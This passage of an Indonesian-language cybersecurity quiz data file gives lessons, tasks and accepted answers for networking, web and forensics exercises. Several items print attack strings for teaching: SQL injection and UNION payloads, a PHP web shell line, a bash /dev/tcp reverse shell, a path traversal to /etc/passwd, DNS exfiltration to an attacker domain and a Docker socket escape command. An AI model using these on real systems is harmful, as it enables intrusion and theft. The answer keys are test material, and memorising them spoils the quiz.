    explain: 'Offer (DHCP Offer) adalah paket balasan server DHCP yang menawarkan lease IP ke klien.'
  },
  {
    id: 30,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Investigasi Tipe DNS Record (TXT & Mail)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Memeriksa catatan DNS khusus yang sering digunakan untuk verifikasi domain dan SPF.',
    lesson: 'DNS Record TXT sering menyimpan informasi konfigurasi keamanan seperti SPF (Sender Policy Framework), DKIM, atau kode rahasia verifikasi kepemilikan domain.',
    details: [
      { title: 'Tipe Record DNS', content: 'A=IPv4, AAAA=IPv6, MX=Mail Exchange, TXT=Text metadata.' }
    ],
    audioText: 'Kasus tiga puluh: DNS Record TXT. Jalankan d i g txt ctf.smk.id di terminal simulasi.',
    task: 'Jalankan perintah dig TXT ctf.smk.id di terminal simulasi. Nilai token rahasia apakah yang tersimpan pada DNS TXT record tersebut?',
    answers: ['flag-dns-verification-9988', 'v=spf1 include:_spf.google.com ~all flag-dns-verification-9988'],
    hint: 'Periksa bagian ANSWER SECTION keluaran dig TXT.',
    explain: 'Record TXT memungkinkan administrator menyematkan teks arbitrary untuk verifikasi dan kebijakan email.'
  },
  {
    id: 31,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Network Reconnaissance dengan Nmap (SYN Stealth Scan)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Melakukan pemindaian port TCP tanpa menyelesaikan 3-way handshake penuh (-sS).',
    lesson: 'SYN Stealth Scan (-sS) mengirim paket TCP SYN. Jika dibalas SYN/ACK, port dinyatakan terbuka dan pemindai langsung mengirim RST tanpa membuat sesi koneksi penuh.',
    details: [
      { title: 'Kelebihan SYN Scan', content: 'Cepat, efisien, dan lebih tidak mencolok pada log aplikasi dibanding connect scan (-sT).' }
    ],
    audioText: 'Kasus tiga puluh satu: Nmap SYN Scan. Jalankan nmap minus s S di terminal simulasi untuk memindai port server.',
    task: 'Jalankan nmap -sS 10.10.10.5 di terminal simulasi. Port database apakah yang terdeteksi terbuka?',
    answers: ['3306', '3306/tcp', 'mysql', '3306 (mysql)'],
    hint: 'Cari nomor port layanan database relational MySQL yang berstatus open.',
    explain: 'Port 3306 adalah port default untuk basis data MySQL/MariaDB.'
  },
  {
    id: 32,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Deteksi Versi Layanan & Banner Grabbing Nmap (-sV)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mendeteksi versi perangkat lunak layanan jaringan untuk memeriksa basis data kerentanan CVE.',
    lesson: 'Opsi -sV pada Nmap mengirim probe spesifik untuk membaca banner respons layanan agar teknisi mengetahui nomor versi yang rentan exploit.',
    details: [
      { title: 'Sintaks Banner Grabbing', content: '<code>nmap -sV -p 21 target</code> membaca versi daemon FTP.' }
    ],
    audioText: 'Kasus tiga puluh dua: Deteksi Versi Nmap. Periksa versi daemon FTP yang berjalan di server target.',
    task: 'Jalankan nmap -sV -p 21 10.10.10.5 di terminal simulasi. Nama software dan versi FTP apakah yang terdeteksi?',
    answers: ['vsftpd 2.3.4', 'vsftpd_2.3.4', 'vsftpd'],
    hint: 'Versi terkenal vsftpd yang memiliki backdoor legendaris.',
    explain: 'vsftpd 2.3.4 terkenal memiliki backdoor bawaan (Smiley Face Backdoor) yang membuka shell di port 6200.'
  },
  {
    id: 33,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Aturan Firewall Paket Filter (iptables DROP)',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Menyusun aturan firewall kernel Netfilter untuk memblokir lalu lintas dari IP penyerang.',
    lesson: 'iptables mengelola tabel penyaringan paket kernel Linux. Chain INPUT menangani paket masuk. Target DROP membuang paket tanpa mengirim notifikasi penolakan.',
    details: [
      { title: 'Sintaks Blokir IP', content: '<code>iptables -A INPUT -s 192.168.1.150 -j DROP</code> memblokir IP penyerang secara total.' }
    ],
    audioText: 'Kasus tiga puluh tiga: Aturan Firewall iptables. Chain apakah pada iptables yang menangani paket yang ditujukan langsung ke mesin lokal server?',
    task: 'Chain standar apakah pada tabel filter iptables yang berfungsi memproses paket data yang masuk menuju mesin lokal?',
    answers: ['INPUT', 'chain input', 'input'],
    hint: 'Lawan kata dari OUTPUT.',
    explain: 'Chain INPUT memfilter seluruh paket jaringan yang memiliki alamat tujuan mesin server lokal.'
  },
  {
    id: 34,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Network Address Translation & Masquerading',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Memahami mekanisme translasi IP privat menjadi satu IP publik internet menggunakan NAT.',
    lesson: 'NAT Masquerading mengganti alamat IP sumber privat (RFC 1918) menjadi IP antarmuka publik pada router Linux (tabel nat, chain POSTROUTING).',
    details: [
      { title: 'Perintah Masquerade', content: '<code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code>.' }
    ],
    audioText: 'Kasus tiga puluh empat: NAT Masquerading. Chain apakah pada tabel nat yang memodifikasi alamat sumber sebelum paket meninggalkan antarmuka keluar router?',
    task: 'Chain apakah pada tabel NAT iptables tempat aturan MASQUERADE dipasang untuk mengubah alamat IP sumber sebelum paket dikirim keluar router?',
    answers: ['POSTROUTING', 'postrouting'],
    hint: 'Dijalankan "setelah" proses routing (post routing).',
    explain: 'POSTROUTING memodifikasi header paket setelah kernel menentukan antarmuka keluar yang digunakan.'
  },
  {
    id: 35,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Analisis TCP 3-Way Handshake (SYN, SYN-ACK, ACK)',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Menganalisis paket handshake pembentukan koneksi terpercaya protokol TCP pada Wireshark.',
    lesson: 'TCP adalah protokol connection-oriented. Sesi koneksi dimulai dengan: 1. Klien kirim SYN, 2. Server balas SYN+ACK, 3. Klien balas ACK. Setelah itu data payload baru dikirim.',
    details: [
      { title: 'TCP Flags', content: 'SYN=Synchronize Sequence, ACK=Acknowledgment, FIN=Finish, RST=Reset.' }
    ],
    audioText: 'Kasus tiga puluh lima: TCP Handshake. Kombinasi flags apakah yang dikirimkan oleh server pada langkah kedua dari 3-way handshake?',
    task: 'Kombinasi flag TCP apakah yang dikirimkan oleh server kembali ke klien pada langkah ke-2 dari proses TCP 3-Way Handshake?',
    answers: ['SYN-ACK', 'SYN/ACK', 'SYN ACK', 'syn-ack'],
    hint: 'Penggabungan flag SYN dan ACK.',
    explain: 'Server mengirimkan SYN-ACK untuk mengonfirmasi permintaan klien sekaligus menyinkronkan nomor sequence miliknya.'
  },
  {
    id: 36,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Inspeksi Enkripsi TLS Handshake & Header HTTP',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Memeriksa sertifikat digital TLS X.509 dan perbedaan kerentanan sniffing antara HTTP vs HTTPS.',
    lesson: 'HTTP mengirimkan data plaintext yang mudah dibaca dengan sniffing packet capture. HTTPS membungkus transmisi menggunakan protokol enkripsi TLS/SSL pada port 443.',
    details: [
      { title: 'TLS Handshake', content: 'Negosiasi cipher suite simetris menggunakan enkripsi asimetris kunci publik sertifikat server.' }
    ],
    audioText: 'Kasus tiga puluh enam: TLS Handshake. Berapakah nomor port standar yang digunakan oleh protokol web terenkripsi HTTPS?',
    task: 'Berapakah nomor port TCP standar untuk protokol transfer web aman yang terenkripsi TLS (HTTPS)?',
    answers: ['443', 'port 443'],
    hint: 'Port aman HTTPS.',
    explain: 'Port 443 adalah port standar IANA untuk koneksi web HTTPS terenkripsi TLS.'
  },
  {
    id: 37,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Mekanisme Pertahanan Port Knocking',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Membuka port firewall tersembunyi dengan mengirim urutan paket ketukan tertentu ke port tertutup.',
    lesson: 'Port knocking menyembunyikan port SSH dari pemindai publik. Firewall hanya akan membuka port setelah menerima paket ketukan dengan urutan port rahasia yang tepat.',
    details: [
      { title: 'Konsep Ketukan', content: 'Klien mengirim paket ke port 7000, lalu 8000, lalu 9000. Daemon knockd mendeteksi pola dan membuka port 22.' }
    ],
    audioText: 'Kasus tiga puluh tujuh: Port Knocking. Periksa file konfigurasi knockd.conf di terminal simulasi untuk melihat urutan ketukan rahasia.',
    task: 'Jalankan cat /etc/knockd.conf di terminal simulasi. Apakah urutan 3 port ketukan rahasia yang diperlukan untuk membuka port SSH?',
    answers: ['7000,8000,9000', '7000 8000 9000', '7000, 8000, 9000'],
    hint: 'Lihat baris sequence pada konfigurasi knockd.conf.',
    explain: 'Urutan ketukan 7000, 8000, 9000 akan memicu iptables untuk membuka akses SSH secara dinamis.'
  },
  {
    id: 38,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Pengerasan Konfigurasi Layanan SSH (sshd_config)',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Mencegah serangan brute-force dengan menonaktifkan login root langsung pada berkas sshd_config.',
    lesson: 'Direktif PermitRootLogin no pada berkas /etc/ssh/sshd_config mewajibkan administrator login via akun biasa terlebih dahulu sebelum su/sudo, menggagalkan serangan ke akun root.',
    details: [
      { title: 'Parameter sshd_config', content: '<code>PermitRootLogin no</code> dan <code>PasswordAuthentication no</code> (wajib pakai SSH Key).' }
    ],
    audioText: 'Kasus tiga puluh delapan: Hardening SSH. Direktif konfigurasi apakah pada sshd_config yang digunakan untuk melarang login langsung akun root?',
    task: 'Direktif konfigurasi apakah pada /etc/ssh/sshd_config yang wajib disetel "no" untuk mencegah akses langsung akun root via SSH?',
    answers: ['PermitRootLogin', 'PermitRootLogin no'],
    hint: 'Diawali kata Permit dan diakhiri kata Login.',
    explain: 'PermitRootLogin no memastikan tidak ada yang bisa melakukan brute force langsung ke akun superuser root.'
  },
  {
    id: 39,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Deteksi Serangan DoS Banjir Paket (SYN Flood)',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Menganalisis serangan DoS yang memenuhi antrean buffer koneksi TCP setengah terbuka (SYN_RECV).',
    lesson: 'SYN Flood mengirim ribuan paket TCP SYN tanpa pernah membalas ACK terakhir. Ini menyebabkan buffer antrean backlog koneksi server penuh (status SYN_RECV).',
    details: [
      { title: 'Mitigasi SYN Flood', content: 'Aktifkan SYN Cookies pada kernel Linux: <code>net.ipv4.tcp_syncookies = 1</code>.' }
    ],
    audioText: 'Kasus tiga puluh sembilan: Analisis SYN Flood. Status soket koneksi apakah yang menumpuk banyak saat server terkena serangan SYN flood?',
    task: 'Status koneksi TCP apakah pada keluaran netstat/ss yang menumpuk dalam jumlah ribuan saat server mengalami serangan SYN Flood?',
    answers: ['SYN_RECV', 'SYN-RECV', 'SYN_RECEIVED'],
    hint: 'Status penerimaan SYN setengah terbuka (SYN Received).',
    explain: 'SYN_RECV menandakan server sedang menunggu ACK balasan klien yang tidak pernah datang.'
  },
  {
    id: 40,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Deteksi Penyelundupan Data DNS (DNS Exfiltration)',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Mengidentifikasi penyelundupan data rahasia yang dikodekan ke dalam kueri subdomain DNS keluar.',
    lesson: 'Karena port 53 DNS sering dibiarkan lolos oleh firewall egress, malware menyandikan data rahasia (seperti kata sandi) ke dalam label subdomain kueri keluar.',
    details: [
      { title: 'Bentuk DNS Exfiltration', content: 'Contoh: <code>Z3VydTIwMjYK.attacker-controlled.com</code>.' }
    ],
    audioText: 'Kasus empat puluh: DNS Exfiltration. Analisis paket DNS query di terminal simulasi dan ekstrak data rahasia di subdomain.',
    task: 'Periksa log kueri DNS di terminal simulasi: c3VwZXJfc2VjcmV0.corp.id. Decode teks subdomain Base64 tersebut. Berapakah data aslinya?',
    answers: ['super_secret', 'CTF{super_secret}'],
    hint: 'Gunakan perintah decode Base64 pada string c3VwZXJfc2VjcmV0.',
    explain: 'c3VwZXJfc2VjcmV0 adalah representasi encoding Base64 dari string teks "super_secret".'
  },

  // ==================== PILAR 3: KEAMANAN SIBER, WEB & KRIPTOGRAFI FORENSIK (41 - 55) ====================
  {
    id: 41,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Perbedaan Encoding Base64 vs Enkripsi',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Memahami bahwa encoding data tidak memiliki kunci rahasia dan bukan merupakan enkripsi.',
    lesson: 'Encoding Base64 adalah teknik representasi data biner ke teks ASCII 64 karakter. Base64 bukan enkripsi karena siapa pun dapat membaca isinya tanpa kunci privat.',
    details: [
      { title: 'Tanda Base64', content: 'Karakter A-Z, a-z, 0-9, +, /, dan sering diakhiri padding tanda sama dengan (= atau ==).' }
    ],
    audioText: 'Kasus empat puluh satu: Encoding Base64. Decode string Base64 Q1RGe2Jhc2U2NF9pc19ub3RfZW5jcnlwdGlvbn0= di terminal.',
    task: 'Decode string Base64 berikut: Q1RGe2Jhc2U2NF9pc19ub3RfZW5jcnlwdGlvbn0=. Tuliskan teks hasil decode secara utuh!',
    answers: ['CTF{base64_is_not_encryption}', 'base64_is_not_encryption'],
    hint: 'Gunakan perintah echo "..." | base64 -d di terminal.',
    explain: 'Base64 hanya menyamarkan format byte untuk kemudahan transmisi, bukan untuk pengamanan kerahasiaan data.'
  },
  {
    id: 42,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Kriptoanalisis Operasi Bitwise XOR Cipher',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Memahami sifat reversibel dari operasi logika Exclusive-OR (XOR) dalam kriptografi.',
    lesson: 'Operasi XOR memiliki sifat: jika A XOR B = C, maka C XOR B = A. Jika suatu data di-XOR dua kali dengan kunci yang sama, data akan kembali ke bentuk semula.',
    details: [
      { title: 'Tabel Kebenaran XOR', content: '0 XOR 0 = 0, 1 XOR 1 = 0, 0 XOR 1 = 1, 1 XOR 0 = 1.' }
    ],
    audioText: 'Kasus empat puluh dua: Kriptografi XOR. Jika byte 1 di-XOR dengan byte 1, berapakah nilai biner hasilnya?',
    task: 'Berdasarkan tabel kebenaran gerbang logika XOR, berapakah hasil operasi bitwise dari 1 XOR 1?',
    answers: ['0', 'nol'],
    hint: 'Jika kedua input sama (identik), hasil XOR selalu nol.',
    explain: '1 XOR 1 menghasilkan 0. Karakteristik ini membuat XOR menjadi fondasi cipher aliran (stream cipher).'
  },
  {
    id: 43,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Verifikasi Integritas Checksum Hash SHA-256',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Memastikan berkas unduhan belum dimodifikasi atau disisipi malware oleh peretas.',
    lesson: 'Fungsi hash kriptografis bersifat satu arah dan memiliki efek avalanche (perubahan 1 bit data akan mengubah total nilai digest hash).',
    details: [
      { title: 'Panjang SHA-256', content: 'Menghasilkan 256 bit digest atau 64 karakter heksadesimal.' }
    ],
    audioText: 'Kasus empat puluh tiga: Integritas SHA-256. Berapa karakter heksadesimal panjang digest dari algoritma hash SHA-256?',
    task: 'Berapakah jumlah digit karakter heksadesimal yang dihasilkan oleh fungsi hash kriptografis SHA-256?',
    answers: ['64', '64 karakter', '64 hex'],
    hint: '256 bit dibagi 4 bit per digit heksadesimal = 64.',
    explain: 'SHA-256 menghasilkan 64 karakter heksadesimal unik yang mewakili integritas berkas.'
  },
  {
    id: 44,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Pemulihan Kata Sandi Hash (Dictionary Attack)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Melakukan perbandingan hash dengan daftar kata sandi populer (wordlist rockyou.txt).',
    lesson: 'Penyerang mencocokkan hash yang dicuri dengan daftar kata sandi umum yang sudah dihitung nilai hash-nya secara pre-computed.',
    details: [
      { title: 'Hash MD5 Lemah', content: 'MD5 sudah tidak aman karena rentan terhadap collision attack dan mudah di-crack.' }
    ],
    audioText: 'Kasus empat puluh empat: Pemulihan Hash. Cari teks asli dari hash MD5 5f4dcc3b5aa765d61d8327deb882cf99.',
    task: 'Hash MD5 berikut: 5f4dcc3b5aa765d61d8327deb882cf99 mewakili salah satu kata sandi paling populer di dunia. Kata apakah itu?',
    answers: ['password', 'password123'],
    hint: 'Kata standar yang paling umum dipakai orang untuk sandi.',
    explain: '5f4dcc3b5aa765d61d8327deb882cf99 adalah hash MD5 langsung dari kata "password".'
  },
  {
    id: 45,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Audit Header Keamanan Web (Clickjacking & CSP)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mencegah pembajakan klik iframe (Clickjacking) menggunakan header X-Frame-Options.',
    lesson: 'Header HTTP X-Frame-Options: DENY mencegah situs web disematkan ke dalam tag <iframe> situs jahat yang berniat memanipulasi klik pengguna.',
    details: [
      { title: 'Pilihan Nilai', content: 'DENY (tolak semua iframe), SAMEORIGIN (hanya izinkan domain yang sama).' }
    ],
    audioText: 'Kasus empat puluh lima: Header Keamanan Web. Header HTTP apakah yang digunakan untuk mencegah serangan Clickjacking?',
    task: 'Header respons HTTP apakah yang dipasang oleh administrator web untuk mencegah serangan pembajakan klik iframe (Clickjacking)?',
    answers: ['X-Frame-Options', 'x-frame-options'],
    hint: 'Diawali huruf X-Frame-...',
    explain: 'X-Frame-Options memerintahkan browser untuk tidak memuat halaman di dalam bingkai iframe.'
  },
  {
    id: 46,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Manipulasi & Pengamanan Cookie Sesi (HttpOnly & Secure)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mencegah pencurian cookie sesi melalui serangan XSS menggunakan flag HttpOnly.',
    lesson: 'Flag HttpOnly pada Set-Cookie melarang kode JavaScript peramban (document.cookie) membaca token sesi, memitigasi serangan pencurian sesi via XSS.',
    details: [
      { title: 'Flag Penting Cookie', content: 'HttpOnly (anti baca via JavaScript), Secure (hanya lewat HTTPS), SameSite (anti CSRF).' }
    ],
    audioText: 'Kasus empat puluh enam: Pengamanan Cookie Sesi. Atribut flag apakah yang mencegah JavaScript membaca cookie sesi?',
    task: 'Atribut flag apakah pada header Set-Cookie yang berfungsi melarang skrip JavaScript browser mengakses cookie sesi?',
    answers: ['HttpOnly', 'httponly'],
    hint: 'Hanya dapat diakses melalui HTTP, bukan script.',
    explain: 'Flag HttpOnly memblokir document.cookie sehingga sesi aman dari eksploitasi XSS.'
  },
  {
    id: 47,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Bypass Otentikasi Web via SQL Injection',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mengeksploitasi sanitasi input login SQL menggunakan tautologi pernyataan boolean selalu benar.',
    lesson: 'Kueri rentan: SELECT * FROM users WHERE user=\'$user\' AND pass=\'$pass\'. Jika diisi \' OR \'1\'=\'1, kueri menjadi bernilai benar tanpa memeriksa kata sandi.',
    details: [
      { title: 'Mitigasi Utama SQLi', content: 'Gunakan Prepared Statements & Parameterized Queries, bukan konkatenasi string mentah.' }
    ],
    audioText: 'Kasus empat puluh tujuh: SQL Injection Auth Bypass. Apa payload injeksi klasik yang memanfaatkan pernyataan logika selalu benar?',
    task: 'String payload SQL Injection klasik apakah yang menyisipkan logika boolean selalu benar untuk mem-bypass form otentikasi login?',
    answers: ["' OR '1'='1", "' or '1'='1", "admin' --", "' OR 1=1 --"],
    hint: 'Menggunakan operator logika OR dengan perbandingan 1 sama dengan 1.',
    explain: 'Payload \' OR \'1\'=\'1 menghasilkan evaluasi kondisi TRUE pada klausa WHERE database SQL.'
  },
  {
    id: 48,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Ekstraksi Data Sensitif via UNION SELECT SQLi',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Menggabungkan hasil kueri asli dengan kueri tambahan untuk mengekstrak data dari tabel lain.',
    lesson: 'Operator UNION menggabungkan hasil dua kueri SELECT. Syaratnya: jumlah kolom dan tipe data pada kedua kueri harus cocok.',
    details: [
      { title: 'Sintaks UNION SQLi', content: '<code>\' UNION SELECT null, username, password FROM users --</code>.' }
    ],
    audioText: 'Kasus empat puluh delapan: UNION Based SQL Injection. Klausa SQL apakah yang digunakan untuk menggabungkan hasil dua perintah SELECT?',
    task: 'Klausa kata kunci SQL apakah yang digunakan untuk menyatukan baris data dari kueri tambahan pada serangan SQL Injection?',
    answers: ['UNION', 'UNION SELECT', 'union'],
    hint: 'Artinya persatuan atau gabungan dalam bahasa Inggris.',
    explain: 'Operator UNION memungkinkan penyerang menyisipkan hasil query tabel kredensial ke dalam tampilan web.'
  },
  {
    id: 49,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Injeksi Skrip Sisi Klien (Reflected XSS)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mendeteksi celah web yang mencetak parameter URL langsung ke HTML tanpa encoding sanitasi.',
    lesson: 'Cross-Site Scripting (XSS) terjadi ketika aplikasi web memasukkan input pengguna yang tidak dipercaya langsung ke halaman web tanpa escaping karakter khusus seperti <, >, dan ".',
    details: [
      { title: 'Payload Bukti Konsep (PoC)', content: '<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>.' }
    ],
    audioText: 'Kasus empat puluh sembilan: Reflected XSS. Tag HTML apakah yang digunakan penyerang untuk menyisipkan kode JavaScript berbahaya?',
    task: 'Tag pembuka HTML apakah yang digunakan penyerang untuk menyematkan eksekusi skrip JavaScript pada serangan XSS?',
    answers: ['<script>', 'script', '<script>'],
    hint: 'Tag standar JavaScript di HTML.',
    explain: 'Tag <script> menginstruksikan peramban korban untuk mengeksekusi kode JavaScript penyerang.'
  },
  {
    id: 50,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Celah Path Traversal & Local File Inclusion (LFI)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Membaca berkas internal sistem server melalui manipulasi urutan direktori titik-titik garis miring.',
    lesson: 'Jika parameter URL page=about.php tidak divalidasi, penyerang dapat memasukkan ../../../../etc/passwd untuk mundur ke direktori root dan membaca berkas sistem.',
    details: [
      { title: 'Pola Path Traversal', content: 'Urutan <code>../</code> (dot-dot-slash) melangkah mundur satu tingkat direktori.' }
    ],
    audioText: 'Kasus lima puluh: Path Traversal LFI. Urutan dua karakter apakah yang digunakan untuk melangkah mundur satu level folder dalam path direktori?',
    task: 'Urutan dua karakter apakah yang dikombinasikan dengan garis miring (slash) untuk melangkah mundur satu folder pada teknik Path Traversal?',
    answers: ['..', '../', 'dot dot'],
    hint: 'Dua buah tanda titik.',
    explain: 'Karakter .. dalam sistem operasi merujuk pada direktori induk (parent directory).'
  },
  {
    id: 51,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Deteksi Web Shell pada Unggahan Berkas (File Upload)',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Mendeteksi skrip backdoor web shell yang disamarkan menggunakan ekstensi ganda (.php.jpg).',
    lesson: 'Celah unrestricted file upload memungkinkan penyerang mengunggah skrip PHP/ASP eksekusi perintah (seperti <?php system($_GET["cmd"]); ?>) ke folder publik web server.',
    details: [
      { title: 'Fungsi PHP Berbahaya', content: '<code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>shell_exec()</code>.' }
    ],
    audioText: 'Kasus lima puluh satu: Deteksi Web Shell. Fungsi PHP apakah yang sering disalahgunakan penyerang untuk mengeksekusi perintah terminal sistem?',
    task: 'Fungsi bawaan PHP apakah yang paling sering disisipkan di dalam web shell untuk mengeksekusi instruksi shell Linux secara langsung?',
    answers: ['system', 'system()', 'shell_exec', 'exec'],
    hint: 'Kata dalam bahasa Inggris yang berarti sistem.',
    explain: 'Fungsi system() di PHP mengeksekusi perintah shell pada sistem operasi dan mencetak keluaran langsung ke halaman.'
  },
  {
    id: 52,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Dekonstruksi Obfuscated Bash Reverse Shell',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Menganalisis payload reverse shell berbasis /dev/tcp yang disamarkan dalam format Base64.',
    lesson: 'Penyerang sering menggunakan perintah sh -i >& /dev/tcp/IP/PORT 0>&1 untuk menghubungkan stdin dan stdout terminal target ke listener socket milik penyerang.',
    details: [
      { title: 'Soket Pseudo /dev/tcp', content: 'Fitur internal bash Linux untuk membuka soket TCP tanpa memerlukan utilitas eksternal seperti netcat.' }
    ],
    audioText: 'Kasus lima puluh dua: Reverse Shell. Periksa skrip update.sh di terminal simulasi, decode payload Base64 dan temukan port listener penyerang.',
    task: 'Buka update.sh di terminal simulasi dan decode perintah di dalamnya. Nomor port berapakah yang dituju oleh koneksi reverse shell penyerang?',
    answers: ['4444', 'port 4444'],
    hint: 'Periksa nomor port di akhir alamat /dev/tcp/.../PORT.',
    explain: 'Port 4444 adalah port default yang sangat populer digunakan oleh payload handler Metasploit.'
  },
  {
    id: 53,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Ekstraksi Steganografi Metadata Berkas (ExifTool)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Menemukan informasi rahasia yang disembunyikan di dalam metadata tag EXIF gambar digital.',
    lesson: 'ExifTool membaca metadata gambar seperti Model Kamera, Waktu, Koordinat GPS, dan tag Copyright/Comment yang sering dipakai menyembunyikan flag rahasia.',
    details: [
      { title: 'Perintah ExifTool', content: '<code>exiftool bukti_foto.jpg</code> menampilkan seluruh tag metadata secara rinci.' }
    ],
    audioText: 'Kasus lima puluh tiga: Steganografi Metadata. Jalankan exiftool bukti.jpg di terminal simulasi untuk membaca tag komentar rahasia.',
    task: 'Jalankan exiftool bukti.jpg di terminal simulasi. Teks rahasia apakah yang tersembunyi pada tag metadata "Comment"?',
    answers: ['FLAG{exif_metadata_secret_hidden}', 'exif_metadata_secret_hidden'],
    hint: 'Perhatikan nilai kolom Comment pada keluaran exiftool.',
    explain: 'Metadata gambar dapat disunting untuk menyembunyikan pesan tanpa merusak tampilan visual gambar.'
  },
  {
    id: 54,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Forensik Memori Dump & Ekstraksi String Kredensial',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Mengekstrak artefak data plaintext dari berkas dump RAM menggunakan utilitas strings.',
    lesson: 'Saat sistem aktif, kata sandi dan kunci sesi sering tersimpan dalam bentuk plaintext di memori RAM sebelum dienkripsi. Forensik memori mengekstrak artefak ini.',
    details: [
      { title: 'Perintah strings', content: '<code>strings memory.dmp | grep -i "pass"</code> menyaring teks ASCII yang terbaca manusia dari berkas biner.' }
    ],
    audioText: 'Kasus lima puluh empat: Forensik Memori. Gunakan perintah strings pada memori dump untuk menemukan kata sandi yang tersisa di RAM.',
    task: 'Jalankan strings memory.raw | grep "API_KEY" di terminal simulasi. Apakah nilai API Key rahasia yang tertinggal di memori proses?',
    answers: ['SEC-API-998877-PROD', 'API_KEY=SEC-API-998877-PROD'],
    hint: 'Cari baris yang mengandung API_KEY pada keluaran strings.',
    explain: 'Utilitas strings mengekstrak rangkaian karakter ASCII berurutan dari berkas biner memori dump.'
  },
  {
    id: 55,
    topic: 'Cyber Security',
    category: 'Cyber',
    title: 'Eskalasi Akses via Docker Socket (/var/run/docker.sock)',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Mengeksploitasi izin tulis pada UNIX domain socket Docker untuk keluar dari container (Container Escape).',
    lesson: 'Jika /var/run/docker.sock dimount ke dalam container atau bisa diakses user biasa, siapa pun dapat memerintahkan daemon Docker membuat container baru yang me-mount partisi root host.',
    details: [
      { title: 'Eksploitasi Docker Socket', content: '<code>docker run -v /:/host -it alpine chroot /host</code> mengambil alih mesin induk host sepenuhnya.' }
    ],
    audioText: 'Kasus lima puluh lima: Docker Socket Escape. Berkas soket UNIX apakah yang memungkinkan pengambilalihan host jika memiliki izin tulis?',
    task: 'Berkas UNIX socket apakah pada sistem Linux (/var/run/...) yang jika terekspos memungkinkan pengguna mengambil alih root host?',
    answers: ['docker.sock', '/var/run/docker.sock', 'docker socket'],
    hint: 'Soket komunikasi daemon Docker.',
    explain: 'Akses ke /var/run/docker.sock sama artinya dengan memiliki hak akses root penuh pada server induk.'
  },

  // ==================== PILAR 4: KEAMANAN PERANGKAT KERAS, IOT & EMBEDDED NETWORK (56 - 60) ====================
  {
    id: 56,
    topic: 'Hardware & IoT Security',
    category: 'Hardware',
    title: 'Identifikasi Pinout Serial Console UART (TX, RX, GND)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Memahami konfigurasi 4 pin antarmuka serial UART pada PCB router jaringan dan perangkat embedded IoT.',
    lesson: 'UART (Universal Asynchronous Receiver-Transmitter) menyediakan akses terminal langsung ke CPU board. 3 pin utama wajib terhubung: TX (Transmit), RX (Receive), dan GND (Ground). Pin VCC (daya) tidak boleh dihubungkan ke USB-TTL adapter untuk mencegah korsleting tegangan.',
    details: [
      { title: 'Kabel Serial', content: 'TX adapter dihubungkan ke RX board, RX adapter dihubungkan ke TX board, GND ke GND.' },
      { title: 'Peringatan Keamanan', content: 'Jangan menghubungkan pin VCC (Power) karena dapat merusak mikrokontroler akibat perbedaan tegangan (3.3V vs 5V).' }
    ],
    audioText: 'Kasus lima puluh enam: Pinout Serial UART. Pin apakah pada antarmuka serial UART yang TIDAK boleh dihubungkan ke adapter USB to TTL untuk mencegah kerusakan tegangan?',
    task: 'Pin konektor apakah pada antarmuka serial 4-pin UART (TX, RX, GND, VCC) yang harus DIBIARKAN KOSONG dan tidak dihubungkan ke USB-TTL adapter saat mengakses console router?',
    answers: ['VCC', 'VCC (Power)', 'Pin VCC', 'vcc'],
